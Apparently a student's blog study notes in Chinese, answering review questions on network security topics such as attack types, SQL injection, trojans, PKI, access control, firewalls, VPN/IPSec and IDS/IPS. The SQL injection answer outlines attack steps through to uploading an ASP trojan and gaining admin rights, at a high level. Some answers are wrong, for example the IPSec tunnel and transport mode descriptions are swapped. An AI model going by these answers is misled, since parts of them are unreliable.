黑客团体不仅对中国的网络安全造成了巨大威胁，对世界各国所造成的威胁也是不容小觑的。</li><li><strong>极端个人的威胁</strong>：随着“维基解密””“棱镜门”等事件的爆发，极端个人利用网络技术挑战整个国家乃至世界的趋势也日益受到关注。</li></ol><h1 id="第2章-常见的网络攻击技术"><a href="#第2章-常见的网络攻击技术" class="headerlink" title="第2章 常见的网络攻击技术"></a>第2章 常见的网络攻击技术</h1><h2 id="网络攻击中的被动攻击和主动攻击"><a href="#网络攻击中的被动攻击和主动攻击" class="headerlink" title="网络攻击中的被动攻击和主动攻击"></a>网络攻击中的被动攻击和主动攻击</h2><p>被动攻击即窃听,是对系统的保密性进行攻击,如搭线窃听、对文件或程序的非法复制等,以获取他人的信息。被动攻击又分为两类:一类是获取消息的内容，另一类是进行业务流分析；抗击这种攻击的重点在于预防而非检测；主动攻击包括对数据流的篡改或产生某些假的数据流。分为3类：①中断 是对系统的可用性进行攻击。②篡改 是对系统的完整性进行攻击。③伪造 是对系统的真实性进行攻击。抗击主动攻击的主要途径是检测,以及对此攻击造成的破坏进行恢复。</p><h2 id="重放攻击原理及防范"><a href="#重放攻击原理及防范" class="headerlink" title="重放攻击原理及防范"></a>重放攻击原理及防范</h2><p>原理：重放攻击(replay attack) 又称重播攻击、回放攻击或新鲜性攻击(freshness attack)等，是指攻击者向目标主机(A)发送一个或多个A已接收过的包(特别是在认证的过程中，用于认证用户身份所接收的包，这个包往往是其他主机所发出的合法认证包)。重放攻击会不断恶意或欺诈性地重复发起一个有效的数据传输来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的安全性。</p><p>防范：挑战—应答机制：(1)客户端向系统申请登录。(2)系统发送挑战值（数值一般特别大）给客户端。(3)客户端计算相应的应答值(可以用MD5算法等计算应答值)。(4)客户端发送应答值给系统。(5)系统通过同样的算法判断应答值是否正确。(6)如果正确则通过认证，允许用户继续后面的操作,认证结束;如果不正确则断开连接,结束。</p><p>时间戳：当主机A接收到一个报文时，当且仅当该报文包含了一 个时间戳，且该时间戳对于 A而言是足够接 近当前时刻的,A才认为该报文是合法的。</p><p>序号：通信双方通过在报文中添加双方都认可的序列号（尽量避免具有一定的规律性）来判断报文的新鲜性，进而判断是否合法。</p><h2 id="SQL注入攻击原理和步骤"><a href="#SQL注入攻击原理和步骤" class="headerlink" title="SQL注入攻击原理和步骤"></a>SQL注入攻击原理和步骤</h2><p>原理：SQL注入攻击通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作；</p><p>步骤：1）判断是否存在SQL注入漏洞；2）分析数据库服务器类型；3）确定XP_CMDSHELL可执行情况；4）发现Web虚拟目录；5）上传ASP木马；6）得到系统的管理员权限；</p><h2 id="病毒是特洛伊木马吗，二者关系"><a href="#病毒是特洛伊木马吗，二者关系" class="headerlink" title="病毒是特洛伊木马吗，二者关系"></a>病毒是特洛伊木马吗，二者关系</h2><p>不是；病毒特征是自我复制、传播、破坏电脑文件，对电脑造成数据上不可逆转的损坏。而木马特征是伪装成正常应用骗取用户信任而入侵，潜伏在电脑中盗取用户资料与信息，一般不会自我复制。</p><h2 id="特洛伊木马为什么不容易发现和删除"><a href="#特洛伊木马为什么不容易发现和删除" class="headerlink" title="特洛伊木马为什么不容易发现和删除"></a>特洛伊木马为什么不容易发现和删除</h2><p>木马拥有较强的隐蔽性，通常隐藏在其他文件中不易被发现；其次木马有很强的顽固性，即使发现了也很难发现。例如木马schoolbus 1.60版本和 2.0版本，启动位置是在 c:\windows\system\runonce.exe中，用户很难修改这个文件，只有重新安装这个文件才可以排除木马；再者木马还有一定的潜伏的能力：表面上的木马被发现并删除以后，后备的木马在一定的条件下会跳出来。</p><h2 id="分析一种针对分布式拒绝服务攻击的防范措施"><a href="#分析一种针对分布式拒绝服务攻击的防范措施" class="headerlink" title="分析一种针对分布式拒绝服务攻击的防范措施"></a>分析一种针对分布式拒绝服务攻击的防范措施</h2><p>目前基于目标计算机系统的防范方法主要三类：网关防范、路由器防范、主机防范；</p><p>网关防范就是利用专门技术和设备在网关上防范DDOS攻击，例如用透明桥接入网络的方正防火墙或方正黑鲨等硬件产品。网关防范主要采用的技术有SynCookie方法、基于IP访问记录的HIP方法、客户计算瓶颈方法。SynCookie方法是在建立TCP连接时，要求客户端响应一个数字回执，来证明自己的真实性。SynCookie方法解决了目标计算机系统的半开连接队列的有限资源问题，从而成为目前被最广泛采用的DDOS防范方法；</p><p>HIP方法采用行为统计方法区分攻击包和正常包，对所有访问IP建立信任级别。当发生DDOS攻击时，信任级别高的IP有优先访问权，从而解决了识别问题。</p><p>客户计算瓶颈方法则将访问时的资源瓶颈从服务器端转移到客户端，从而大大提升分布式拒绝服务攻击的代价，例如资源访问定价方法。</p><h2 id="交换机有被监听的风险吗"><a href="#交换机有被监听的风险吗" class="headerlink" title="交换机有被监听的风险吗"></a>交换机有被监听的风险吗</h2><p>交换机就像十字路口，网线就像马路，理论上通过网线和交换机的数据是可以被监听的，就像马路上开的车是什么车牌，只要在路边上的人，都能看到。</p><h1 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h1><h2 id="能够用于身份认证的人体生物特征有哪些"><a href="#能够用于身份认证的人体生物特征有哪些" class="headerlink" title="能够用于身份认证的人体生物特征有哪些"></a>能够用于身份认证的人体生物特征有哪些</h2><p>声音、指纹、面部、视网膜、掌纹、虹膜、笔迹、击键、DNA</p><h2 id="PKI的核心服务有哪些"><a href="#PKI的核心服务有哪些" class="headerlink" title="PKI的核心服务有哪些"></a>PKI的核心服务有哪些</h2><p>认证、完整性、密钥管理、简单机密性</p><h2 id="PKI的认证服务有哪些优点"><a href="#PKI的认证服务有哪些优点" class="headerlink" title="PKI的认证服务有哪些优点"></a>PKI的认证服务有哪些优点</h2><p>(1)使用PKI的认证可以进行实体强鉴别;(2)实体可用自己的签名私钥向本地或远程环境的实体认证自己的身份，实现了网络环境身份鉴别;(3)签名和私钥可以用于数据来源认证。</p><h2 id="PKI有哪些组成部分，它们之间存在哪些关系"><a href="#PKI有哪些组成部分，它们之间存在哪些关系" class="headerlink" title="PKI有哪些组成部分，它们之间存在哪些关系"></a>PKI有哪些组成部分，它们之间存在哪些关系</h2><p>一个PKI 系统需要多个组件实体之间的联合操作，主要包括认证中心CA、注册中心（Registration Authority, RA）、LDAP（LightWeight Directory Access Protocol）目录服务器、应用接口等;</p><p>CA 是整个PKI 系统中的可信第三方，它保证了公钥证书的合法性，是整个PKI 系统的核心，负责对用户证书的签发、作废、更新和管理；RA 负责对证书申请用户进行审查，对通过审核的用户进行注册，并协助CA 对证书的签发和管理；目录服务器用于存取证书和证书作废表（CRL, Certificate Revocation List）信息；一个完整的PKI 必须提供良好的应用接口系统，使得各种各样的应用能够以安全、一致、可信的方式与PKI 交互，确保安全网络环境的完整性和易用性。</p><h2 id="PKI系统是如何实现认证、保密、不可否认性的"><a href="#PKI系统是如何实现认证、保密、不可否认性的" class="headerlink" title="PKI系统是如何实现认证、保密、不可否认性的"></a>PKI系统是如何实现认证、保密、不可否认性的</h2><p>PKI采用证书管理密钥，通过可信 CA将用户的身份信息与其公钥相捆绑，提供身份认证服务；基于PKI的认证服务通过数字签名和密码技术来确认身份。、</p><h2 id="SSO的作用，有哪些模型"><a href="#SSO的作用，有哪些模型" class="headerlink" title="SSO的作用，有哪些模型"></a>SSO的作用，有哪些模型</h2><p>作用：一次登录，全部访问</p><p>模型：基于经纪人的SSO模型，基于代理的SSO模型、基于网关的SSO模型、基于令牌的SSO模型</p><h1 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h1><h2 id="举例说明自主访问控制、强制访问控制、RBAC三种技术的应用场合"><a href="#举例说明自主访问控制、强制访问控制、RBAC三种技术的应用场合" class="headerlink" title="举例说明自主访问控制、强制访问控制、RBAC三种技术的应用场合"></a>举例说明自主访问控制、强制访问控制、RBAC三种技术的应用场合</h2><p><strong>DAC（自主访问控制） 就是让客体的所有者来定义访问控制规则</strong>。想象一下，你想要从图书馆中拿走一本书。这个时候，管理员说，“你经过这本书的所有人同意了吗？”这个过程就是 DAC。</p><p><strong>MAC (强制访问控制）是一种基于安全级别标签的访问控制策略</strong>。我们还是用图书馆的例子来解释一下，当你在图书馆排队借书的时候，听到管理员说：“初中生不能借阅高中生的书籍。”这就是一种强制访问控制。在互联网中，主体和客体被划分为“秘密、私人、敏感、公开”这四个级别。MAC 要求对所有的主体和客体都打上对应的标签，然后根据标签来制定访问控制规则。</p><p><strong>rule-BAC（RBAC) 就是制定某种规则，将主体、请求和客体的信息结合起来进行判定</strong>。在 rule-BAC 的控制机制中，如果你想要在图书馆借书，管理员会说，“根据规定，持有阅览证就可以借书。”</p><h2 id="个人防火墙是否存在安全缺陷"><a href="#个人防火墙是否存在安全缺陷" class="headerlink" title="个人防火墙是否存在安全缺陷"></a>个人防火墙是否存在安全缺陷</h2><p>存在，个人防火墙主要的缺点就是对公共网络只有一个物理接口。要记住，真正的防火墙应当监视并控制两个或更多的网络接口之间的通信。这样一来的话，个人防火墙本身可能会容易受到威胁，或者说是具有这样一个弱点，网络通信可以绕过防火墙的规则。</p><h2 id="防火墙有哪两种基本策略以及应用场景"><a href="#防火墙有哪两种基本策略以及应用场景" class="headerlink" title="防火墙有哪两种基本策略以及应用场景"></a>防火墙有哪两种基本策略以及应用场景</h2><p>策略：1）未经明确允许的一律禁止；2）未经明确禁止的一律允许</p><p>从安全性的角度考虑的话第一种策略更可取一些，从灵活性以及使用方便性的角度考虑的话，第二种策略则</p><p>更适合</p><h2 id="防火墙能否保证内部网络的绝对安全"><a href="#防火墙能否保证内部网络的绝对安全" class="headerlink" title="防火墙能否保证内部网络的绝对安全"></a>防火墙能否保证内部网络的绝对安全</h2><p>不能，防火墙在设置好的情况下,只能防止外部网络对你内部网络的入侵，无法禁止内部用户对网络主机的各种攻击，对此必须要求内部人员了解网络攻击的各种类型，并懂得保护自己的用户口令和周期性变换口令的必要性。</p><h2 id="包过滤防火墙工作于OSI哪一层，检测IP数据包的哪些部分"><a href="#包过滤防火墙工作于OSI哪一层，检测IP数据包的哪些部分" class="headerlink" title="包过滤防火墙工作于OSI哪一层，检测IP数据包的哪些部分"></a>包过滤防火墙工作于OSI哪一层，检测IP数据包的哪些部分</h2><p>网络层和传输层；</p><p>检查以下内容：</p><p>1）源IP 地址和目的IP 地址；<br>2）上层协议（ICP、UDP、ICMP 等）；<br>3）TCP/UDP 源端口和TCP/UDP 目标端口；<br>4）ICMP 消息类型；<br>5）TCP 包头中的ACK 位等。</p><h2 id="包过滤技术与Sniffer的异同点"><a href="#包过滤技术与Sniffer的异同点" class="headerlink" title="包过滤技术与Sniffer的异同点"></a>包过滤技术与Sniffer的异同点</h2><p>同：都可以监听网络上的IP包；异：包过滤技术还可以决定检测到的包的舍弃与否；包过滤技术的原理在于利用路由器监视并过滤网络上流入流出的IP包，拒绝发送可疑的，而sniffer是一种利用以太网的特性把网络适配卡置为杂乱模式状态的工具，一旦网卡设置为这种模式，它就能接收传输在网络上的每一个信息包。</p><h2 id="相比双宿网关防火墙，屏蔽子网防火墙有哪些特点"><a href="#相比双宿网关防火墙，屏蔽子网防火墙有哪些特点" class="headerlink" title="相比双宿网关防火墙，屏蔽子网防火墙有哪些特点"></a>相比双宿网关防火墙，屏蔽子网防火墙有哪些特点</h2><p>1、双宿网关防火墙中内部网络与外部网络之间是一个代理服务器，而屏蔽子网防火墙中内外网络之间是DMZ，其中包括两个路由器和一个堡垒主机；</p><p>2、双宿网关防火墙中代理服务器是通过一台主机进行内部网络与外部网络之间的隔离，因此，充当代理服务器的主机很容易收到外部攻击。入侵者只要破坏了这一层的保护就可以很容易地进入内部网络。屏蔽子网防火墙中对代理服务器的改进是在内网和外网之间建立一个子网进行隔离，在此构造下堡垒主机是最容易受侵袭的，万一发生堡垒主机被入侵控制的情况，对于采用屏蔽子网的网络体系结构，入侵者仍然不能直接侵袭内部网络，因为内部网络受到内部过滤路由器的保护；</p><p>3、双宿网关防火墙对内外网络通信的安全检测都是通过代理服务器进行的，而屏蔽子网防火墙则分别通过内部防火墙和外部防火墙来进行对内外网络信息的安全检测。</p><h2 id="比较应用层代理、传输层代理和SOCKS代理的异同点"><a href="#比较应用层代理、传输层代理和SOCKS代理的异同点" class="headerlink" title="比较应用层代理、传输层代理和SOCKS代理的异同点"></a>比较应用层代理、传输层代理和SOCKS代理的异同点</h2><p>异：应用层代理工作在TCP/IP模型的应用层之上，它只能用于支持代理的应用层协议（如HTTP，FTP）。它提供的控制最多，但是不灵活，必须要有相应的协议支持。如果协议不支持代理（如SMTP和POP），那就只能在应用层以下代理，也即传输层代理。传输层代理直接与TCP层交互，更加灵活。要求代理服务器具有部分真正服务器的功能：监听特定TCP或UDP端口，接收客户端的请求同时向客户端发出相应的响应。另一种代理需要改变客户端的IP栈，即SOCKS代理。它是可用的最强大、最灵活的代理标准协议。SOCKS4允许代理服务器内部的客户端完全地连接到外部的服务器，SOCKS5增加了对客户端的授权和认证，因此它是一种安全性较高的代理。</p><p>同：能节约IP地址、能通过缓存加快浏览速度、都有较好的安全性、都可以进行过滤、都有强大的日志功能、都对服务器的主机有强大的依赖性。</p><h2 id="概述分布式防火墙的工作原理及其优势"><a href="#概述分布式防火墙的工作原理及其优势" class="headerlink" title="概述分布式防火墙的工作原理及其优势"></a>概述分布式防火墙的工作原理及其优势</h2><p>原理：安全策略的制定采用由中心策略服务器集中定义方式，而安全策略的执行则由相关主机节点独立实施；安全日志由主机节点分散产生，而安全日志的保存则集中到中心策略服务器上。由此，我们可以看出分布式防火墙规则的制定还是采用集中定义和更新的方式，然后将这些定义好的规则策略分发到各个相关节点，最后再在每个受保护的主机节点上独立实施执行。</p><p>优势：防火墙不再受限于拓扑结构，并且将单点防护变成了多点防护，即全民皆兵，从而大大提高了防护能力和数据交换效率。同时，分布式防火墙不会再有边界防火墙存在的瓶颈问题，吞吐量不再受防火墙的速率限制，某一点的连接失败不再会隔离整个网络。</p><h2 id="当前防火墙的最新发展状况"><a href="#当前防火墙的最新发展状况" class="headerlink" title="当前防火墙的最新发展状况"></a>当前防火墙的最新发展状况</h2><p>1、防火墙的防御能力，从简单包过滤技术到统一威胁管理技术，在过去多年也已经发生了巨大的革新，而随着AI技术的快速发展及在防火墙中的不断应用，新一代防火墙的防御能力将再次得到升华。可以预期，随着AI算力的不断提升及AI算法的不断成熟，融入AI技术的新一代防火墙必将成为未来防火墙市场发展的主流。</p><p>2、多级过滤技术，是指防火墙采用多级过滤措施，并辅以鉴别手段。在分组过滤（网络层）一级，过滤掉所有的源路由分组和假冒的IP源地址；在传输层一级，遵循过滤规则，过滤掉所有禁止出或/和入的协议和有害数据包如nuke包、圣诞树包等；在应用网关（应用层）一级，能利用FTP、SMTP等各种网关，控制和监测Internet提供的所用通用服务。</p><p>3、使防火墙具有病毒防护功能。现在通常被称之为”病毒防火墙”，当然目前主要还是在个人防火墙中体现，因为它是纯软件形式，更容易实现。</p><h1 id="第五章习题"><a href="#第五章习题" class="headerlink" title="第五章习题"></a>第五章习题</h1><h2 id="1-什么是-VPN？VPN-有哪些主要功能？"><a href="#1-什么是-VPN？VPN-有哪些主要功能？" class="headerlink" title="1. 什么是 VPN？VPN 有哪些主要功能？"></a>1. 什么是 VPN？VPN 有哪些主要功能？</h2><p><strong>定义：</strong>通过私有隧道技术在公共网络上仿真一条点到点专线，从而达到信息安全传输的目的。这就是VPN</p><p><strong>主要功能：</strong></p><ul><li><p>数据封装 ：VPN 技术提供带寻址报头的数据封装机制； </p></li><li><p>认证：VPN 连接中包括两种认证方式——单向认证和双向认证。单向认证是指在 VPN 连接建立之前，VPN 服务器对请求建立连接的 VPN 客户机进行身份验证，核 查其是否为合法的授权用户。如果使用双向验证，还需进行 VPN 客户机对 VPN 服 务器的身份验证，以防伪装的非法服务器提供错误信息；</p></li><li><p>数据完整性和合法性认证：检查链路上传输的数据是否出自源端以及在传输过程中 是否经过篡改。VPN 链路中传输的数据包含密码检查，密钥只由发送者和接受者 双方共享； </p></li><li>数据加密：数据由发送者加密，接收者解密，以确保其在公共网络上的传输安全。 加解密过程要求发送方和接收方共享密钥。</li></ul><h2 id="2-根据访问方式的不同，VPN-可以分为哪几类？"><a href="#2-根据访问方式的不同，VPN-可以分为哪几类？" class="headerlink" title="2. 根据访问方式的不同，VPN 可以分为哪几类？"></a>2. 根据访问方式的不同，VPN 可以分为哪几类？</h2><p>按照不同的用途，虚拟专用网可以分为三类： </p><ul><li>内联网 VPN：在机构的各个分支机构之间建立的虚拟专用网，称为“内联网虚拟专 用网”；</li><li>远程访问 VPN：在分支机构与远地员工等移动用户之间建立虚拟专用网，称为“远 程访问虚拟专用网”；</li><li>外联网 VPN：在某个机构与其它相关业务单位、合作伙伴等之间建立虚拟专用网， 称为“外联网虚拟专用网”。</li></ul><h2 id="3-VPN-安全协议可以在哪些层次实现？各个层次分别包含哪些主要的安全协议？"><a href="#3-VPN-安全协议可以在哪些层次实现？各个层次分别包含哪些主要的安全协议？" class="headerlink" title="3. VPN 安全协议可以在哪些层次实现？各个层次分别包含哪些主要的安全协议？"></a>3. VPN 安全协议可以在哪些层次实现？各个层次分别包含哪些主要的安全协议？</h2><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/image-20210515212948750.png" class="lozad"></p><h2 id="4-简要概述-PPTP-VPN-的工作原理，并指出其优缺点。"><a href="#4-简要概述-PPTP-VPN-的工作原理，并指出其优缺点。" class="headerlink" title="4. 简要概述 PPTP VPN 的工作原理，并指出其优缺点。"></a>4. 简要概述 PPTP VPN 的工作原理，并指出其优缺点。</h2><p><strong>工作原理：</strong>点对点隧道协议 PPTP 是一种支持多协议虚拟专用网的网络技术，它可以使远程用户通 过 Internet 安全地访问用户内部网。通过点对点隧道协议，远程用户可以通过 Windows XP、 Windows Vista 等操作系统以及其它支持点对点协议（PPP，Point-to-Point Protocol）的系统 拨号连接到 Internet 服务提供商（ISP，Internet Service Provider），再通过 Internet 与其内部 网连接。 PPTP 工作在 OSI 模型的第二层（数据链路层），它在所有通信流之上简单的建立了一 条加密隧道。PPTP 已被嵌入到 Windows 98 以后的各种微软操作系统中，用于 Microsoft 的 路由和远程访问服务。</p><p><strong>优点</strong>是简单易行： PPTP/L2TP 对使用微软操作系统的用户来说很方便，因为微软已把它作为路由软 件的一部分； PPTP/L2TP 位于数据链路层，包括 IPv4 在内的多张网络协议可以采用它们作为链 路协议，支持流量控制；PPTP/L2TP 通过减少丢包来减少重传、改善网络性能。</p><p><strong>缺点</strong>：PPTP 和 L2TP 对 PPP 协议本身并没有做任何修改，只是将用户的 PPP 帧基于 GRE 封装成 IP 报文。在两台计算机之间创建和打开数据通道，一旦通道打开，源和目 的用户身份就不再需要，这样可能带来问题；PPTP/L2TP 不对两个节点间的信息传输进行监视或控制； PPTP 和 L2TP 限制同时最多只能连接 255 个用户，可扩展性不强，且不适合于向 Ipv6 的转移； 端用户需要在连接前手工建立加密信道； 没有提供内在的安全机制，认证和加密受到限制，没有强加密和认证支持； 不支持企业与外部客户以及供应商之间会话的保密性需求，不支持外联网 VPN。 安全程度差是 PPTP/L2TP 最大的弱点。因此，PPTP 和 L2TP 最适合用于客户远程访问 虚拟专用网，而对于安全要求高的内部信息，用 PPTP/L2TP 传输与用明文传输的差别并不 大。</p><h2 id="5-IPSec-的-AH-和-ESP-方式有何不同？为什么提供了-ESP-后还需要提供-AH？"><a href="#5-IPSec-的-AH-和-ESP-方式有何不同？为什么提供了-ESP-后还需要提供-AH？" class="headerlink" title="5. IPSec 的 AH 和 ESP 方式有何不同？为什么提供了 ESP 后还需要提供 AH？"></a>5. IPSec 的 AH 和 ESP 方式有何不同？为什么提供了 ESP 后还需要提供 AH？</h2><p>AH和ESP的最大区别有两个：一个是AH不提供加密服务，另一个是它们验证的范围不同，ESP不验证IP报头，而AH同时验证部分报头，所以需要结合使用AH和ESP才能保证IP报头的机密性和完整性。 AH为IP报头提供尽可能多的验证保护，验证失败的包将被丢弃，不交给上层协议解密，这种操作模式可以减少拒绝服务攻击成功的机会。</p><p>AH 机制主要为通信提供完整性保护，当用户对于数据的保密性要求不高时，AH 能够 确保数据的完整性、提供数据源认证和防重放攻击，但 AH 不提供加密功能，数据以明文传 送。AH 不支持网络地址转换 NAT 和端口地址转换 PAT。</p><p>ESP 机制能够确保数据的完整性、提供数据源认证、数据加密和防重放攻击。如果对数 据的保密性有要求，或者有局域网内用内部地址，采用了 NAT，那么就只能选择 ESP。应 用 ESP 时，接收方对于数据分组先认证后解密，可以降低 DoS 攻击的危险。</p><h2 id="6-IPSec-的隧道操作提供了两种模式：隧道模式和传输模式，比较这两种方式各自的-优缺点，适用的场合。"><a href="#6-IPSec-的隧道操作提供了两种模式：隧道模式和传输模式，比较这两种方式各自的-优缺点，适用的场合。" class="headerlink" title="6.IPSec 的隧道操作提供了两种模式：隧道模式和传输模式，比较这两种方式各自的 优缺点，适用的场合。"></a>6.IPSec 的隧道操作提供了两种模式：隧道模式和传输模式，比较这两种方式各自的 优缺点，适用的场合。</h2><p><strong>隧道模式:</strong>适合点到点的连接，即主机与主机之间的 VPN 可以用传输模式。其数 据分组中的原始 IP 报头保留不动，在后面插入 AH 认证头或 ESP 的头部和尾部，仅对数据 净荷进行认证或加密，网络中的寻址直接根据数据的原始 IP 地址进行。</p><p><strong>传输模式：</strong>适合用于 VPN 安全网关之间的连接， 即用于路由器、防火墙、VPN 集中器等网络设备之间。发送端的 VPN 安全网关对原始 IP 报文整体加密，再在前面加入一 个新的 IP 包头，用新的 IP 地址（接收端 VPN 的地址）将数据分组路由到接收端。</p><p><strong>优缺点：</strong>在隧道模式下，IPSec 把 IPv4 数据包整体封装中，可以保护端到端的安全性。隧道模式 具有更高的安全性，但也会带来较大的系统开销。另外，采用隧道方式时，是对整个 IP 数 据包认证或加密，即隧道协议只能在 IP 协议之上进行，这种模式不支持其他网络协议。</p><p><strong>使用场景：</strong>隧道模式可以适用于任何场景  传输模式只能适合pc到pc的场景</p><h2 id="7-简要概述-MPLS-VPN-的组成部分及各部分功能。"><a href="#7-简要概述-MPLS-VPN-的组成部分及各部分功能。" class="headerlink" title="7.简要概述 MPLS VPN 的组成部分及各部分功能。"></a>7.简要概述 MPLS VPN 的组成部分及各部分功能。</h2><p>MPLS VPN 网络主要由 CE、PE 和 P 三大部分组成，</p><ul><li>用户网络边缘路由器 CE（Custom Edge Router）直接与服务提供商网络相连，它“感 知”不到 VPN 的存在；</li><li>骨干网边缘路由器 PE（Provider Edge Router）与用户的 CE 直接相连，负责 VPN 业务接入，处理 VPN-IPv4 路由，是 MPLS 三层 VPN 的主要实现者；</li><li>骨干网核心路由器 P（Provider Router）负责快速转发数据，不与 CE 直接相连。</li><li>在 MPLS VPN 中，P、PE 设备需要支持 MPLS 的基本功能，CE 设备不必支持 MPLS。</li></ul><h2 id="8-MPLS-节点中的路由表是如何产生的？MPLS-VPN-中的标签在-IP-分组转发过程中-如何起作用？（我感觉考的可能性不大-老师给的重点里也没有这个）"><a href="#8-MPLS-节点中的路由表是如何产生的？MPLS-VPN-中的标签在-IP-分组转发过程中-如何起作用？（我感觉考的可能性不大-老师给的重点里也没有这个）" class="headerlink" title="8.MPLS 节点中的路由表是如何产生的？MPLS VPN 中的标签在 IP 分组转发过程中 如何起作用？（我感觉考的可能性不大 老师给的重点里也没有这个）"></a>8.MPLS 节点中的路由表是如何产生的？MPLS VPN 中的标签在 IP 分组转发过程中 如何起作用？（我感觉考的可能性不大 老师给的重点里也没有这个）</h2><p>路由器之间通过 IP 路由协议或静态路由产生正常的路由表；</p><p>（1）MPLS 入口路由器根据目的地址查找路由表，找到其下一跳路由器的转发标签； （2）将该 IP 分组打上标签，转发给下一跳路由器； （3）下一跳路由器查找其 MPLS 标签转发表，替换分组中原有的标签后，继续转发； 当打有标签的 IP 包到达某路由器时，分组中上一站路由器的出站标签对应当前 路由器的入站标签。路由器不再根据目的地址查找路由表，而是根据标签查找 MPLS 标签转发表，选择出站的通路； （4）转发动作持续进行，直至到达出口路由器。出口路由器根据分组的目的地址查找 其 MPLS 标签转发表，发现自身就是目的地网络，于是弹出标签，送给相应端口 处理，标签交换过程结束。</p><h2 id="9-SSL-握手协议分为几个阶段？每个阶段的主要功能是什么"><a href="#9-SSL-握手协议分为几个阶段？每个阶段的主要功能是什么" class="headerlink" title="9.SSL 握手协议分为几个阶段？每个阶段的主要功能是什么"></a>9.SSL 握手协议分为几个阶段？每个阶段的主要功能是什么</h2><p>SSL 握手协议包含两个阶段，第一个阶段用于建立私密性通信信道，第二个阶段用于客 户认证。</p><h1 id="第六章习题"><a href="#第六章习题" class="headerlink" title="第六章习题"></a>第六章习题</h1><h2 id="1-入侵检测系统弥补了防火墙的哪些不足？"><a href="#1-入侵检测系统弥补了防火墙的哪些不足？" class="headerlink" title="1.入侵检测系统弥补了防火墙的哪些不足？"></a>1.入侵检测系统弥补了防火墙的哪些不足？</h2><p>入侵检测系统的建立可以尽早地发现异常网络访问行为，尽早地检测到入侵行为，并可 以尽早地消除入侵。如果说防火墙是网络的第一道关口，那么，入侵检测系统则是网络的第 二道关口。</p><h2 id="2-比较基于主机和基于网络的入侵检测系统的优点与缺点。"><a href="#2-比较基于主机和基于网络的入侵检测系统的优点与缺点。" class="headerlink" title="2. 比较基于主机和基于网络的入侵检测系统的优点与缺点。"></a>2. 比较基于主机和基于网络的入侵检测系统的优点与缺点。</h2><p>p179 p180 太多了</p><p>基于主机的入侵检查系统在速度上没有基于网络的入侵检查系统快捷</p><h2 id="3-根据检测原理，入侵检测系统可以分为几类？其原理分别是什么？"><a href="#3-根据检测原理，入侵检测系统可以分为几类？其原理分别是什么？" class="headerlink" title="3. 根据检测原理，入侵检测系统可以分为几类？其原理分别是什么？"></a>3. 根据检测原理，入侵检测系统可以分为几类？其原理分别是什么？</h2><p>两类 基于主机 和基于网络 </p><p>基于主机的入侵检测系统是通过学习以前的攻击形式，并选择合适的方法来抵御未来的 攻击。基于主机的 IDS 仍使用验证记录，但自动化程度大大提高，并发展了可迅速做出响 应的检测技术。通常，基于主机的 IDS 可监测系统、事件和 Window 下的安全记录以及 UNIX 环境下的系统记录。当有文件发生变化时，IDS 将新的记录条目与攻击标记相比较，看它们 是否匹配。如果匹配，系统就会向管理员报警并向别的目标报告，以便采取相应的措施进行 处理。</p><p>基于网络的入侵检测系统对网络上流经的数据包进行分析。基于网络的 IDS 通常利用 一个运行在“混乱模式”下网络的适配器来实时监视并分析通过网络的所有通信业务。所谓 “混乱模式”是指能够监听本网段内的所有网络包。一旦检测到了攻击行为，IDS 的响应模块 进行通知、报警并对攻击采取相应的反应。反应因产品而异，但通常都包括通知管理员、中 断连接并保存会话记录。</p><h2 id="4-操作系统审计痕迹与系统日志有哪些不同之处？"><a href="#4-操作系统审计痕迹与系统日志有哪些不同之处？" class="headerlink" title="4. 操作系统审计痕迹与系统日志有哪些不同之处？"></a>4. 操作系统审计痕迹与系统日志有哪些不同之处？</h2><p>系统日志会因人而异，不同操作人登录只有本人系统日志；操作系统审痕迹包括了所有有权才操作者的登陆轨迹，还包括了系统内部必要的痕迹</p><p>操作系统审计迹一般是由操作系统的内核产生，它比系统日志保护得更好，更加详细。系统日志则比较简单明了，比较容易理解。许多基于主机的IDS被设计成一种支持集中式IDS的管理和报告基础结构，这种基础结构允许一个管理控制台跟踪多个主机。</p><h2 id="5-查阅资料，简要概述-P2DR2-安全模型的基本思想。"><a href="#5-查阅资料，简要概述-P2DR2-安全模型的基本思想。" class="headerlink" title="5. 查阅资料，简要概述 P2DR2 安全模型的基本思想。"></a>5. 查阅资料，简要概述 P2DR2 安全模型的基本思想。</h2><p>形成“策略、防护、检测、响应、恢复”（Policy、Protection、 Detection、 Response、 Recovery）的P2DR2模型。这是一种动态的、自适应的安全处理模型。在风险处理时可以参考此模型，以适应安全风险和安全需求的不断变化，提供持续的安全保障。</p><h2 id="6-按照实现方式分类，IPS-可以分为哪几类？简要概述它们各自的特点。"><a href="#6-按照实现方式分类，IPS-可以分为哪几类？简要概述它们各自的特点。" class="headerlink" title="6. 按照实现方式分类，IPS 可以分为哪几类？简要概述它们各自的特点。"></a>6. 按照实现方式分类，IPS 可以分为哪几类？简要概述它们各自的特点。</h2><p>1）防火墙与 IDS 的联动系统 2）在线网络入侵检测系统 3）七层交换机  4）应用入侵防御系统 5）混合交换机</p><p>在线 NIDS 具有如下特点：  能够监视和保护大范围的服务器和网络；  不仅能够处理已知攻击，还可以通过配置通用规则，处理一些未知攻击；  作为传统 NIDS 的变体，仍然受限于 PC 架构下网卡抓包方式的性能问题。</p><p>七层交换机具有如下特点：  采用专门的硬件来获得高性能，速度快，并且能够进行负载均衡和冗余配置；  无法进行完全的通话过程还原和深层次入侵分析，只能检测特征明显的已知攻击。</p><p>应用入侵防御系统具有如下特点：  是一种 IPS 的软件实现，实施白名单过滤机制，对应用提供细粒度的防护；  实施前必须充分测试被保护的应用系统，且一旦应用升级，需要重新测试；  关键技术在于特定应用与操作系统间的交互机制和应用服务器的内存管理。</p><h2 id="7-IDS-和-IPS-的区别与联系"><a href="#7-IDS-和-IPS-的区别与联系" class="headerlink" title="7. IDS 和 IPS 的区别与联系"></a>7. IDS 和 IPS 的区别与联系</h2><p>IPS 并不是防火墙和入侵检测系统的简单组合，它是一种有取舍地吸取了防火墙和入侵检测系统功能的一个新产品，其目的是为网络提供深层次的、有效的安全防护。 IPS 的防火墙功能比较简单，它串联在网络上，主要起对攻击行为进行阻断的作用，其本身 也可以当作 IP 防火墙来使用.IPS 的检测功能类似于 IDS，但相比较 IDS 缺乏实用价值的 响应机制而言，IPS 